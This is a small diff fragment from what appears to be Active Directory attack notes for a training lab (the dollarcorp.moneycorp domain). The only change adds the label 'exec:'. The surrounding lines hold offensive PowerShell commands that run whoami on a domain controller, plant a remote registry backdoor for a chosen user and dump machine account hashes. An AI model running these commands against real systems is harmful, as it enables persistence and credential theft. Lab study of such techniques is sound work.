@@ -184,6 +184,7 @@ Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.
 ```
 Add-RemoteRegBackdoor -ComputerName <FQDN-MACHINE> -Trustee <user> -Verbose
 ```
+exec:
 ```
 Get-RemoteMachineAccountHash -ComputerName <FQDN-MACHINE> -Verbose
 ```
